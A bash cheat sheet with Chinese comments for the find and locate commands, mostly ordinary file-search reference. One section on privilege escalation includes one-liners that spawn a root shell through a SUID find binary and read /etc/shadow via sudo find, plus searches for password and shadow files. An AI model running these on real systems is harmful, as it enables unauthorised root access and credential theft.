```bash
# find 命令：在指定路径下按条件查找文件，可对结果执行动作

# 按名称
find / -name "*.conf"          # -name 按文件名匹配，区分大小写
find / -iname "*ssh*"          # -iname 忽略大小写
find . -regex ".*\.sh"         # -regex 正则匹配完整路径

# 按类型
find / -type f                 # 普通文件
find / -type d                 # 目录
find / -type l                 # 符号链接
find / -type s                 # socket
find / -type p                 # 命名管道

# 按大小（单位：b块 c字节 w双字 k M G）
find / -size +100M             # 大于 100MB
find / -size -1k               # 小于 1KB
find / -size 50c               # 正好 50 字节

# 按时间
find / -mtime +7               # 修改时间超过 7 天
find / -mmin -60               # 60 分钟内修改过
find / -atime +1               # 按访问时间
find / -amin -30               # 按访问时间（分钟）
find / -ctime +1               # 按状态变化时间
find / -newer file             # 比指定文件新

# 按权限与所有者
find / -perm -4000             # 设了 SUID 位
find / -perm -2000             # 设了 SGID 位
find / -perm -1000             # 设了粘滞位
find / -user root              # 所有者
find / -group root             # 所属组
find / -writable               # 当前用户可写（GNU 扩展）

# 逻辑操作符
find / \( -name "*.sh" -o -name "*.py" \) -type f   # -o 或，括号需转义

# 动作
find . -name "*.log" -print                    # -print 打印（默认）
find . -name "*.log" -ls                       # -ls ls -l 风格
find . -name "*.log" -delete                   # -delete 删除
find . -name "*.log" -exec rm {} \;            # -exec 对每个结果执行
find /var/log -name "*.log" -exec grep -l "error" {} +   # {} + 批量执行

# 提权 / 安全枚举
find / -perm -4000 -type f 2>/dev/null         # 枚举 SUID 文件
find / -perm -2000 -type f 2>/dev/null         # 枚举 SGID 文件
find / -writable -type f 2>/dev/null           # 找可写文件
find / -type f -name "*.bak" 2>/dev/null       # 找备份文件
/usr/bin/find . -exec /bin/sh -p \; -quit      # find 带 SUID 时弹 shell 提权
sudo find . -exec cat /etc/shadow \;           # sudo find 读任意文件

# locate：基于数据库查找，速度比 find 快
locate "*.conf"                # 按文件名查找，支持通配符
locate "passwd" "shadow"       # 多关键字，取并集
locate -i "ssh"                # -i 忽略大小写
locate -b "server.conf"        # -b 只匹配文件名，不匹配路径
locate -c "*.log"              # -c 只输出匹配数量
locate -l 5 "*.log"            # -l 只显示前 5 条
locate -r "\.sh$"              # -r 正则匹配
locate -e "*.conf"             # -e 只列出仍存在的文件
locate -q "*.log"              # -q 静默，不输出无权限错误
locate -S                      # -S 显示数据库统计信息
updatedb                       # 更新 locate 数据库（root 运行）
/etc/updatedb.conf             # updatedb 配置文件（排除路径等）

# locate 返回结果过多时，常需配合其他命令二次筛选
locate "*.conf" | grep -i server       # 管道给 grep 过滤关键字
locate "*.log" | grep -v archive       # grep -v 排除含 archive 的结果
locate "*.conf" | grep -E "/etc/"      # 正则只保留 /etc 目录下的匹配
locate "passwd" | head -20             # head 只看前 20 条
locate "*.txt" | wc -l                 # wc -l 统计条数（等价 locate -c）
locate "*.sh" | xargs ls -l            # xargs 把结果作为参数执行命令
locate "config" | xargs grep -l pass   # 对每个结果文件再 grep 内容
```
